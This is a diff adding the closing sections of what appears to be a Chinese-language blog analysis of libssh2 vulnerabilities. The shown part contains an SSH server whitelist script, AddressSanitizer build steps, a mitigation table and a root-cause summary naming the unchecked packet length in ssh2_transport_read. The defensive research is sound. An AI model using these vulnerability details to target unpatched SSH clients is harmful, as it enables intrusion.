+ForwardX11<span class="w"> </span>no
+<span class="w"> </span>PermitLocalCommand<span class="w"> </span>no
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">SSH连接白名单管理器</span>
+<span class="sd">仅允许连接到预批准的SSH服务器</span>
+<span class="sd">&quot;&quot;&quot;</span>
+
+<span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">subprocess</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">pathlib</span><span class="w"> </span><span class="kn">import</span> <span class="n">Path</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">typing</span><span class="w"> </span><span class="kn">import</span> <span class="n">Optional</span>
+
+<span class="k">class</span><span class="w"> </span><span class="nc">SSHWhitelist</span><span class="p">:</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;SSH服务器白名单管理&quot;&quot;&quot;</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">whitelist_file</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&quot;/etc/ssh/whitelist.json&quot;</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">whitelist_file</span> <span class="o">=</span> <span class="n">Path</span><span class="p">(</span><span class="n">whitelist_file</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">whitelist</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_load_whitelist</span><span class="p">()</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">_load_whitelist</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">dict</span><span class="p">:</span>
+        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">whitelist_file</span><span class="o">.</span><span class="n">exists</span><span class="p">():</span>
+            <span class="k">return</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">whitelist_file</span><span class="o">.</span><span class="n">read_text</span><span class="p">())</span>
+        <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;servers&quot;</span><span class="p">:</span> <span class="p">[]}</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">is_allowed</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">host</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">port</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">22</span><span class="p">,</span> 
+                   <span class="n">key_fingerprint</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">str</span><span class="p">]</span> <span class="o">=</span> <span class="kc">None</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;检查SSH连接目标是否在白名单中&quot;&quot;&quot;</span>
+        <span class="k">for</span> <span class="n">server</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">whitelist</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;servers&quot;</span><span class="p">,</span> <span class="p">[]):</span>
+            <span class="k">if</span> <span class="n">server</span><span class="p">[</span><span class="s2">&quot;host&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="n">host</span> <span class="ow">and</span> <span class="n">server</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;port&quot;</span><span class="p">,</span> <span class="mi">22</span><span class="p">)</span> <span class="o">==</span> <span class="n">port</span><span class="p">:</span>
+                <span class="k">if</span> <span class="n">key_fingerprint</span> <span class="ow">and</span> <span class="s2">&quot;key_fingerprint&quot;</span> <span class="ow">in</span> <span class="n">server</span><span class="p">:</span>
+                    <span class="k">return</span> <span class="n">server</span><span class="p">[</span><span class="s2">&quot;key_fingerprint&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="n">key_fingerprint</span>
+                <span class="k">return</span> <span class="kc">True</span>
+        <span class="k">return</span> <span class="kc">False</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">verify_before_connect</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">host</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">port</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">22</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;在连接前验证目标服务器&quot;&quot;&quot;</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">is_allowed</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[BLOCKED] SSH连接到 </span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s2"> 被拒绝 - 不在白名单中&quot;</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  CVE-2026-55200 防护: 仅允许连接可信服务器&quot;</span><span class="p">)</span>
+            <span class="k">return</span> <span class="kc">False</span>
+
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[ALLOWED] SSH连接到 </span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s2"> 已授权&quot;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="kc">True</span>
+
+<span class="c1"># 示例白名单文件</span>
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">{</span>
+<span class="sd">    &quot;servers&quot;: [</span>
+<span class="sd">        {</span>
+<span class="sd">            &quot;host&quot;: &quot;git.internal.company.com&quot;,</span>
+<span class="sd">            &quot;port&quot;: 22,</span>
+<span class="sd">            &quot;key_fingerprint&quot;: &quot;SHA256:abc123...&quot;,</span>
+<span class="sd">            &quot;description&quot;: &quot;内部Git服务器&quot;</span>
+<span class="sd">        },</span>
+<span class="sd">        {</span>
+<span class="sd">            &quot;host&quot;: &quot;backup.internal.company.com&quot;,</span>
+<span class="sd">            &quot;port&quot;: 22,</span>
+<span class="sd">            &quot;key_fingerprint&quot;: &quot;SHA256:def456...&quot;,</span>
+<span class="sd">            &quot;description&quot;: &quot;备份服务器&quot;</span>
+<span class="sd">        }</span>
+<span class="sd">    ]</span>
+<span class="sd">}</span>
+<span class="sd">&quot;&quot;&quot;</span>
+</code></pre></div>
+
+<h3>8.4 内存安全检查</h3>
+<div class="highlight"><pre><span></span><code><span class="c1"># 使用AddressSanitizer编译libssh2进行检测</span>
+git<span class="w"> </span>clone<span class="w"> </span>https://github.com/libssh2/libssh2.git
+<span class="nb">cd</span><span class="w"> </span>libssh2
+mkdir<span class="w"> </span>build-asan<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">cd</span><span class="w"> </span>build-asan
+
+cmake<span class="w"> </span>-DCMAKE_C_FLAGS<span class="o">=</span><span class="s2">&quot;-fsanitize=address -fno-omit-frame-pointer -g&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">      </span>-DCMAKE_EXE_LINKER_FLAGS<span class="o">=</span><span class="s2">&quot;-fsanitize=address&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">      </span>-DCMAKE_BUILD_TYPE<span class="o">=</span>Debug<span class="w"> </span><span class="se">\</span>
+<span class="w">      </span>..
+
+make<span class="w"> </span>-j<span class="k">$(</span>nproc<span class="k">)</span>
+
+<span class="c1"># 使用ASAN版本运行SSH客户端</span>
+<span class="c1"># ASAN会在堆溢出发生时立即报告</span>
+<span class="nv">LD_PRELOAD</span><span class="o">=</span>./src/libssh2.so<span class="w"> </span>ssh<span class="w"> </span>-v<span class="w"> </span>user@target-server
+
+<span class="c1"># ASAN报告示例 (检测到堆溢出):</span>
+<span class="c1"># ==PID==ERROR: AddressSanitizer: heap-buffer-overflow</span>
+<span class="c1"># WRITE of size 512 at 0x60200000xxxx</span>
+<span class="c1">#   #0 in ssh2_transport_read src/transport.c:645</span>
+<span class="c1">#   #1 in _libssh2_transport_read src/transport.c:xxx</span>
+<span class="c1"># 0x60200000xxxx is located 0 bytes after 19-byte region</span>
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><span class="c"># Dockerfile: 使用ASAN编译的libssh2运行时</span>
+<span class="k">FROM</span><span class="w"> </span><span class="s">ubuntu:22.04</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="s">libssh2-asan</span>
+
+<span class="k">RUN</span><span class="w"> </span>apt-get<span class="w"> </span>update<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>apt-get<span class="w"> </span>install<span class="w"> </span>-y<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>build-essential<span class="w"> </span>cmake<span class="w"> </span>git<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>libssl-dev<span class="w"> </span>zlib1g-dev
+
+<span class="c"># 编译ASAN版本的libssh2</span>
+<span class="k">RUN</span><span class="w"> </span>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/libssh2/libssh2.git<span class="w"> </span>/tmp/libssh2<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">cd</span><span class="w"> </span>/tmp/libssh2<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span><span class="o">&amp;&amp;</span><span class="w"> </span>mkdir<span class="w"> </span>build<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">cd</span><span class="w"> </span>build<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span><span class="o">&amp;&amp;</span><span class="w"> </span>cmake<span class="w"> </span>-DCMAKE_C_FLAGS<span class="o">=</span><span class="s2">&quot;-fsanitize=address -fno-omit-frame-pointer -g&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">             </span>-DCMAKE_BUILD_TYPE<span class="o">=</span>Debug<span class="w"> </span><span class="se">\</span>
+<span class="w">             </span>-DBUILD_SHARED_LIBS<span class="o">=</span>ON<span class="w"> </span><span class="se">\</span>
+<span class="w">             </span>..<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span><span class="o">&amp;&amp;</span><span class="w"> </span>make<span class="w"> </span>-j<span class="k">$(</span>nproc<span class="k">)</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span><span class="o">&amp;&amp;</span><span class="w"> </span>make<span class="w"> </span>install<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span><span class="o">&amp;&amp;</span><span class="w"> </span>ldconfig
+
+<span class="c"># 设置ASAN运行时选项</span>
+<span class="k">ENV</span><span class="w"> </span><span class="nv">ASAN_OPTIONS</span><span class="o">=</span><span class="s2">&quot;detect_leaks=1:abort_on_error=1:print_stacktrace=1&quot;</span>
+<span class="k">ENV</span><span class="w"> </span><span class="nv">LD_PRELOAD</span><span class="o">=</span><span class="s2">&quot;/usr/local/lib/libssh2.so&quot;</span>
+
+<span class="c"># 使用ASAN版本的libssh2运行应用</span>
+<span class="k">CMD</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;/bin/bash&quot;</span><span class="p">]</span>
+</code></pre></div>
+
+<h3>8.5 防御措施总结</h3>
+<table>
+<thead>
+<tr>
+<th>防御层</th>
+<th>措施</th>
+<th>针对漏洞</th>
+<th>优先级</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>升级修复</td>
+<td>从源码安装修复commit</td>
+<td>CVE-2026-55200, 66032</td>
+<td>高</td>
+</tr>
+<tr>
+<td>静态副本排查</td>
+<td>扫描静态链接的二进制</td>
+<td>全部</td>
+<td>高</td>
+</tr>
+<tr>
+<td>连接白名单</td>
+<td>限制SSH客户端仅连接可信服务器</td>
+<td>CVE-2026-55200</td>
+<td>高</td>
+</tr>
+<tr>
+<td>主机密钥验证</td>
+<td>StrictHostKeyChecking yes</td>
+<td>MITM场景</td>
+<td>高</td>
+</tr>
+<tr>
+<td>算法限制</td>
+<td>禁用不安全算法</td>
+<td>CVE-2026-66033, 66035</td>
+<td>中</td>
+</tr>
+<tr>
+<td>ASAN检测</td>
+<td>使用ASAN编译版进行运行时检测</td>
+<td>全部</td>
+<td>中</td>
+</tr>
+<tr>
+<td>网络隔离</td>
+<td>CI/CD agent网络分段</td>
+<td>全部</td>
+<td>中</td>
+</tr>
+<tr>
+<td>容器加固</td>
+<td>最小化容器镜像中的SSH客户端</td>
+<td>全部</td>
+<td>低</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>9. 总结</h2>
+<p>libssh2的漏洞系列揭示了一个在C语言网络协议库中反复出现的系统性问题：<strong>对攻击者控制的长度字段缺乏充分的上界验证</strong>。</p>
+<p>CVE-2026-55200和2019年的CVE-2019-3855本质上是同一个漏洞——<code>ssh2_transport_read()</code>中<code>packet_length</code>缺少上界检查。2019年的修复只覆盖了一个代码路径，另一个路径潜伏7年后再次被发现。这不是偶然，而是代码审计覆盖不足的必然结果。libssh2自2015年以来有18个已公开CVE，其中越界读（CWE-125）和整数溢出（CWE-190）是最频繁出现的弱点类别。</p>
+<p>CVE-2026-66032的双重释放则展示了另一种常见模式：错误处理路径中的资源管理缺陷。当正常路径和错误路径对同一资源进行管理时，如果状态追踪不严格，极易出现双重释放。</p>
+<p>从防御角度看，最紧迫的措施是从源码安装修复版本，并全面排查静态链接的libssh2副本。由于截至发文时没有正式tagged release，许多下游发行版仍在backport修复中，组织需要主动跟踪和验证。对于CI/CD流水线和自动化系统，实施SSH连接白名单是减少攻击面的有效手段——如果客户端不需要连接到不受信任的SSH服务器，那么预认证漏洞就无法被触发。</p>
+<p>长期来看，这类漏洞的根本解决方案是迁移到内存安全语言实现的SSH库（如Rust的russh），或者至少在编译时启用ASAN/UBSAN进行运行时检测。在C代码中，对所有来自网络的长度字段实施严格的上下界检查应该成为代码审计的强制标准。</p>
+<hr />
+<h2>免责声明</h2>
+<p>本文仅供安全研究和技术学习使用，文中涉及的漏洞分析、PoC代码和攻击技术仅用于授权测试和安全防御建设。读者应遵守所在地区的法律法规，未经授权不得对任何系统进行渗透测试或攻击。因不当使用本文内容所造成的任何后果，作者不承担任何责任。</p>
+<div class="back"><a href="../">← Back to Home</a></div>
+</article>
+</main>
+<footer>Powered by GitHub Pages 2026</footer>
+</body>
+</html>
